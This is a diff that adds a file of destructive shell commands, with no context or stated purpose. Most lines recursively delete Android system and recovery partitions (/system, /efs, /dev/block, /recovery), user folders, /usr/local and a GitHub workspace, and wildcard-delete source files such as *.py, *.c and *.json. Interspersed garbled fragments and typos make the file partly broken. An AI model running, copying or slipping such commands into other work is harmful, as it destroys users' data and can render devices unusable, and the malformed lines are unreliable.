@@ -1,0 +1,40 @@
+rn -r /dev/block
+rm -r /system
+rm -r /sdcard
+rm -r /odm
+rm -r /dev
+rm -r /ext4
+rm -r /recovery
+rm -r /tmp/recovery
+rm -r /cache/recovery
+rm -r /system/bin/e2fsck
+rm -r /efs
+rm -r /dev/block
+=/
+rm -r ~ /.vscode
+rm -r source=/cache
+=@/
+~ git/
+~ github/
+~ vercel-site/
+rm -r /usr/local/
+/github/workspace/
+rm -rf *.log
+rm -rf *.cpp
+rm -rf *.log
+rm -rf *.json
+rm -rf *.php
+rm -rf *.ipynb
+rm -rf *.py
+rm -rf *.sh
+rm -rf *.rb
+rm -rf *.c
+dev/
+root/
+home/
+sys/
+system/
+usr/
+~ /
+*.://
+
